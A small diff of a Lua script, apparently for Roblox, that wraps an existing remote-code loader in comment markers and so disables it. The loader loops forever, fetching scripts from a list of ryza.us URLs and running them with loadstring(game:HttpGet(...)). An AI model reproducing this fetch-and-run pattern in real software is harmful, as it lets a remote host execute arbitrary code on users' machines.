@@ -1,3 +1,5 @@
+--[[
+
 local urlsToRequest = {
     "https://ryza.us/api/getscript/loader/v2/utilityCore",
     "https://ryza.us/api/getscript/loader/v2/gameHandler",
@@ -83,3 +85,6 @@ while wait() do
         loadstring(game:HttpGet(getRandomUrl()))()
     end)
 end
+
+
+]]
